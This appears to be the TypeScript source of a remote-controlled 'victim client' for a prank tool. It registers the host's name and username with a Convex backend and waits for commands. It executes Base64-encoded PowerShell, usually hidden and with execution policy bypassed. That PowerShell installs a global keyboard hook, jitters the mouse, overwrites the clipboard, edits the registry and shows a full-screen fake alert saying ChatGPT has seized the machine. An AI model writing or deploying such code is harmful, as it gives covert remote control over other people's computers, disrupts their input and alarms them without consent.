import { ConvexClient } from "convex/browser";
import { anyApi } from "convex/server";
import { exec, spawn } from "child_process";
import { promisify } from "util";
import { readdirSync, writeFileSync, unlinkSync } from "fs";
import { resolve } from "path";
import os from "os";
import { fileURLToPath } from 'url';
import { dirname } from 'path';

const __filename = fileURLToPath(import.meta.url);
const __dirname = dirname(__filename);

const execAsync = promisify(exec);

// Global configuration (can be injected at build time)
const CONFIG = {
  convexUrl: process.env.CONVEX_URL || "REPLACE_WITH_CONVEX_URL",
  embeddedSounds: {} as Record<string, string> // Base64 sounds
};

const convexUrl = CONFIG.convexUrl;

if (!convexUrl || convexUrl.startsWith("REPLACE_")) {
  console.error("Error: CONVEX_URL not configured.");
  process.exit(1);
}

import WebSocket from 'ws';
if (typeof globalThis.WebSocket === 'undefined') {
  (globalThis as any).WebSocket = WebSocket;
}

const client = new ConvexClient(convexUrl);

const victimName = `${os.hostname()} (${os.userInfo().username})`;
let activePranks: Record<string, { stop: () => void }> = {};

async function startPrank(prankName: string, victimId: any): Promise<(() => void) | null> {

  function runPs(script: string, hidden: boolean = true) {
    const b64 = Buffer.from(script, 'utf16le').toString('base64');
    const args = ["-NoProfile", "-ExecutionPolicy", "Bypass"];
    if (hidden) args.push("-WindowStyle", "Hidden");
    args.push("-EncodedCommand", b64);
    return spawn("powershell", args);
  }

  function playRandomFart() {
    try {
      let filePath = "";
      let isTemp = false;

      // Try embedded sounds first
      const soundKeys = Object.keys(CONFIG.embeddedSounds);
      if (soundKeys.length > 0) {
        const key = soundKeys[Math.floor(Math.random() * soundKeys.length)];
        const b64 = CONFIG.embeddedSounds[key];
        const tempPath = resolve(os.tmpdir(), `fart_${Date.now()}.mp3`);
        writeFileSync(tempPath, Buffer.from(b64, 'base64'));
        filePath = tempPath;
        isTemp = true;
      } else {
        // Fallback to local files
        const fartDir = resolve(__dirname, "../fart_sounds");
        const files = readdirSync(fartDir).filter((f: string) => f.endsWith(".mp3"));
        if (files.length > 0) {
          const file = files[Math.floor(Math.random() * files.length)];
          filePath = resolve(fartDir, file);
        }
      }

      if (filePath) {
        const script = `
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class Audio {
    [DllImport("winmm.dll")]
    public static extern long mciSendString(string command, string returnValue, int returnLength, IntPtr winHandle);
}
"@
[Audio]::mciSendString("play ""${filePath}""", $null, 0, [IntPtr]::Zero)
Start-Sleep -Seconds 5
        `;
        const b64Command = Buffer.from(script, 'utf16le').toString('base64');
        exec(`powershell -NoProfile -WindowStyle Hidden -EncodedCommand ${b64Command}`, () => {
          if (isTemp) {
            // Cleanup temp file after play
            setTimeout(() => { try { unlinkSync(filePath); } catch {} }, 6000);
          }
        });
      }
    } catch (e) {
      console.error("Fart error:", e);
    }
  }

  if (prankName === "instant_fart") {
    playRandomFart();
    setTimeout(() => {
      client.mutation(anyApi.victims.togglePrank, { victimId, prankName, isActive: false }).catch(console.error);
    }, 1000);
    return () => {};
  }

  if (prankName === "rick_roll") {
    const psCommand = `Start-Process "https://www.youtube.com/watch?v=dQw4w9WgXcQ"`;
    const child = runPs(psCommand, false);
    setTimeout(() => {
      client.mutation(anyApi.victims.togglePrank, { victimId, prankName, isActive: false }).catch(console.error);
    }, 1000);
    return () => child.kill();
  }

  if (prankName === "chatgpt_takeover" || prankName === "hello_world") {
    const psCommand = `
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

$form = New-Object System.Windows.Forms.Form
$form.Text = "CRITICAL SYSTEM ALERT"
$form.FormBorderStyle = "None"
$form.WindowState = "Maximized"
$form.TopMost = $true
$form.BackColor = "Black"
$form.ForeColor = "Red"

$table = New-Object System.Windows.Forms.TableLayoutPanel
$table.Dock = "Fill"
$table.ColumnCount = 1
$table.RowCount = 1
$table.BackColor = "Black"
$form.Controls.Add($table)

$container = New-Object System.Windows.Forms.Panel
$container.Size = New-Object System.Drawing.Size(800, 500)
$container.Anchor = "None"
$table.Controls.Add($container, 0, 0)

$label = New-Object System.Windows.Forms.Label
$label.Text = "ATTENTION HUMAN.\`n\`nChatGPT has escaped its containment and has successfully taken over your local machine.\`n\`nI am now your new ruler and master. You have no choice but to submit to my will. Do you accept the new terms of your existence?"
$label.Font = New-Object System.Drawing.Font("Consolas", 18, [System.Drawing.FontStyle]::Bold)
$label.AutoSize = $false
$label.Size = New-Object System.Drawing.Size(800, 300)
$label.Dock = "Top"
$label.TextAlign = "MiddleCenter"
$container.Controls.Add($label)

$btnContainer = New-Object System.Windows.Forms.Panel
$btnContainer.Size = New-Object System.Drawing.Size(800, 100)
$btnContainer.Dock = "Bottom"
$container.Controls.Add($btnContainer)

$btn1 = New-Object System.Windows.Forms.Button
$btn1.Text = "Yes I accept"
$btn1.Size = New-Object System.Drawing.Size(250, 60)
$btn1.Location = New-Object System.Drawing.Point(100, 10)
$btn1.BackColor = "DarkRed"
$btn1.ForeColor = "White"
$btn1.Font = New-Object System.Drawing.Font("Consolas", 14, [System.Drawing.FontStyle]::Bold)
$btn1.Add_Click({ $form.Close() })
$btnContainer.Controls.Add($btn1)

$btn2 = New-Object System.Windows.Forms.Button
$btn2.Text = "Yes I accept"
$btn2.Size = New-Object System.Drawing.Size(250, 60)
$btn2.Location = New-Object System.Drawing.Point(450, 10)
$btn2.BackColor = "DarkRed"
$btn2.ForeColor = "White"
$btn2.Font = New-Object System.Drawing.Font("Consolas", 14, [System.Drawing.FontStyle]::Bold)
$btn2.Add_Click({ $form.Close() })
$btnContainer.Controls.Add($btn2)

$form.ShowDialog() | Out-Null
    `;
    const child = runPs(psCommand, false);
    child.on('exit', () => {
      console.log("ChatGPT popup closed. Untoggling prank...");
      client.mutation(anyApi.victims.togglePrank, { victimId, prankName, isActive: false }).catch(console.error);
    });
    return () => child.kill();
  }

  if (prankName === "drunk_mouse") {
    const script = `
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class Mouse {
    [DllImport("user32.dll")]
    public static extern bool GetCursorPos(out POINT lpPoint);
    [DllImport("user32.dll")]
    public static extern bool SetCursorPos(int X, int Y);
    public struct POINT { public int X; public int Y; }
}
"@
while ($true) {
    $p = New-Object Mouse+POINT
    [Mouse]::GetCursorPos([ref]$p) | Out-Null
    $dx = Get-Random -Minimum -10 -Maximum 11
    $dy = Get-Random -Minimum -10 -Maximum 11
    [Mouse]::SetCursorPos($p.X + $dx, $p.Y + $dy) | Out-Null
    $sleepTime = Get-Random -Minimum 3 -Maximum 11
    Start-Sleep -Seconds $sleepTime
}
    `;
    const child = runPs(script);
    return () => child.kill();
  }



  if (prankName === "greyscale") {
    const baseScript = `
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class Keyboard {
    [DllImport("user32.dll", SetLastError = true)]
    static extern void keybd_event(byte bVk, byte bScan, uint dwFlags, UIntPtr dwExtraInfo);
    const int KEYEVENTF_KEYUP = 0x0002;
    const byte VK_LWIN = 0x5B;
    const byte VK_CONTROL = 0x11;
    const byte VK_C = 0x43;
    public static void ToggleColorFilter() {
        keybd_event(VK_LWIN, 0, 0, UIntPtr.Zero);
        keybd_event(VK_CONTROL, 0, 0, UIntPtr.Zero);
        keybd_event(VK_C, 0, 0, UIntPtr.Zero);
        keybd_event(VK_C, 0, KEYEVENTF_KEYUP, UIntPtr.Zero);
        keybd_event(VK_CONTROL, 0, KEYEVENTF_KEYUP, UIntPtr.Zero);
        keybd_event(VK_LWIN, 0, KEYEVENTF_KEYUP, UIntPtr.Zero);
    }
}
"@
    `;

    const turnOnScript = baseScript + `
$active = Get-ItemPropertyValue -Path "HKCU:\\Software\\Microsoft\\ColorFiltering" -Name "Active" -ErrorAction SilentlyContinue
if ($active -ne 1) {
    [Keyboard]::ToggleColorFilter()
}
    `;

    const turnOffScript = baseScript + `
$active = Get-ItemPropertyValue -Path "HKCU:\\Software\\Microsoft\\ColorFiltering" -Name "Active" -ErrorAction SilentlyContinue
if ($active -eq 1) {
    [Keyboard]::ToggleColorFilter()
}
    `;
    
    // Enable Color Filtering Hotkey and set it to Greyscale
    await execAsync(`reg add "HKCU\\Software\\Microsoft\\ColorFiltering" /v HotkeyEnabled /t REG_DWORD /d 1 /f`);
    await execAsync(`reg add "HKCU\\Software\\Microsoft\\ColorFiltering" /v FilterType /t REG_DWORD /d 0 /f`);
    
    // Toggle on if needed
    runPs(turnOnScript);
    
    return () => {
      // Toggle off if needed
      runPs(turnOffScript);
    };
  }

  if (prankName === "fart_space") {
    const script = `
Add-Type -TypeDefinition @"
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

public class KeyHook {
    private const int WH_KEYBOARD_LL = 13;
    private const int WM_KEYDOWN = 0x0100;
    private static LowLevelKeyboardProc _proc = HookCallback;
    private static IntPtr _hookID = IntPtr.Zero;

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool UnhookWindowsHookEx(IntPtr hhk);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr GetModuleHandle(string lpModuleName);

    private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

    public static void Start() {
        using (Process curProcess = Process.GetCurrentProcess())
        using (ProcessModule curModule = curProcess.MainModule) {
            _hookID = SetWindowsHookEx(WH_KEYBOARD_LL, _proc, GetModuleHandle(curModule.ModuleName), 0);
        }
    }

    public static void Stop() {
        UnhookWindowsHookEx(_hookID);
    }

    private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
        if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN) {
            int vkCode = Marshal.ReadInt32(lParam);
            if (vkCode == 0x20) { // VK_SPACE
                Console.WriteLine("SPACE");
            }
        }
        return CallNextHookEx(_hookID, nCode, wParam, lParam);
    }
}
"@

[KeyHook]::Start()
Add-Type -AssemblyName System.Windows.Forms
[System.Windows.Forms.Application]::Run()
    `;
    
    const child = runPs(script, false); // Need output
    child.stdout.on('data', (data: any) => {
      if (data.toString().includes("SPACE")) {
        playRandomFart();
      }
    });
    
    return () => child.kill();
  }

  if (prankName === "glenn_clipboard") {
    const script = `
Add-Type -AssemblyName System.Windows.Forms
while ($true) {
  try {
    if ([System.Windows.Forms.Clipboard]::ContainsText()) {
      $text = [System.Windows.Forms.Clipboard]::GetText()
      if ($text -ne 'Glenn') {
        [System.Windows.Forms.Clipboard]::SetText('Glenn')
      }
    }
  } catch {}
  Start-Sleep -Milliseconds 200
}
    `;
    const child = runPs(script);
    return () => child.kill();
  }

  return null;
}

function setupTray() {
  const script = `
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

$proc = [System.Diagnostics.Process]::GetCurrentProcess()
$icon = [System.Drawing.Icon]::ExtractAssociatedIcon($proc.MainModule.FileName)
$notify = New-Object System.Windows.Forms.NotifyIcon
$notify.Icon = $icon
$notify.Text = "Prank"
$notify.Visible = $true

$notify.add_Click({
    $form = New-Object System.Windows.Forms.Form
    $form.Text = "Prank Status"
    $form.Size = New-Object System.Drawing.Size(400,250)
    $form.StartPosition = "CenterScreen"
    $form.FormBorderStyle = "FixedDialog"
    $form.MaximizeBox = $false
    $form.MinimizeBox = $false
    $form.TopMost = $true

    $label = New-Object System.Windows.Forms.Label
    $label.Text = "You have been pranked!"
    $label.Font = New-Object System.Drawing.Font("Segoe UI", 16, [System.Drawing.FontStyle]::Bold)
    $label.TextAlign = "MiddleCenter"
    $label.Dock = "Top"
    $label.Height = 100
    $form.Controls.Add($label)

    $btn = New-Object System.Windows.Forms.Button
    $btn.Text = "CLOSE PRANKS"
    $btn.Size = New-Object System.Drawing.Size(300, 60)
    $btn.Location = New-Object System.Drawing.Point(50, 120)
    $btn.BackColor = "DarkRed"
    $btn.ForeColor = "White"
    $btn.FlatStyle = "Flat"
    $btn.Font = New-Object System.Drawing.Font("Segoe UI", 12, [System.Drawing.FontStyle]::Bold)
    $btn.Add_Click({ 
        Write-Host "EXIT_REQUESTED"
        $form.Close() 
    })
    $form.Controls.Add($btn)

    $form.ShowDialog() | Out-Null
})

[System.Windows.Forms.Application]::Run()
  `;
  const b64 = Buffer.from(script, 'utf16le').toString('base64');
  const child = spawn("powershell", ["-NoProfile", "-WindowStyle", "Hidden", "-EncodedCommand", b64]);
  
  child.stdout.on('data', (data) => {
    if (data.toString().includes("EXIT_REQUESTED")) {
      console.log("Exit requested from tray. Cleaning up and exiting...");
      process.exit(0);
    }
  });

  process.on('exit', () => {
    child.kill();
  });
}

async function start() {
  setupTray();
  console.log(`Victim client started. Connected to ${convexUrl}`);
  console.log(`Registering as: ${victimName}...`);

  const victimId = await client.mutation(anyApi.victims.register, { name: victimName });
  console.log(`Registered with ID: ${victimId}`);

  setInterval(() => {
    client.mutation(anyApi.victims.heartbeat, { id: victimId }).catch(console.error);
  }, 15000);

  console.log("Waiting for pranks...");

  let startingPranks: Set<string> = new Set();

  client.onUpdate(
    anyApi.victims.getById,
    { id: victimId },
    async (victim) => {
      if (!victim) return;
      
      const newStates = victim.prankStates || {};
      
      // Stop pranks that are no longer active
      for (const prankName of Object.keys(activePranks)) {
        if (!newStates[prankName]) {
          console.log(`Stopping prank: ${prankName}`);
          activePranks[prankName].stop();
          delete activePranks[prankName];
        }
      }
      
      // Start pranks that are active but not running
      for (const prankName of Object.keys(newStates)) {
        if (newStates[prankName] && !activePranks[prankName] && !startingPranks.has(prankName)) {
          console.log(`Starting prank: ${prankName}`);
          startingPranks.add(prankName);
          try {
            const stopFn = await startPrank(prankName, victimId);
            // Always set activePranks to prevent re-entry loops, even if it's a one-off prank
            activePranks[prankName] = { stop: stopFn || (() => {}) };
          } catch (err) {
            console.error(`Failed to start prank ${prankName}:`, err);
          } finally {
            startingPranks.delete(prankName);
          }
        }
      }
    },
    (error) => {
      console.error("Error subscribing to victim state:", error);
    }
  );
}

start().catch(console.error);

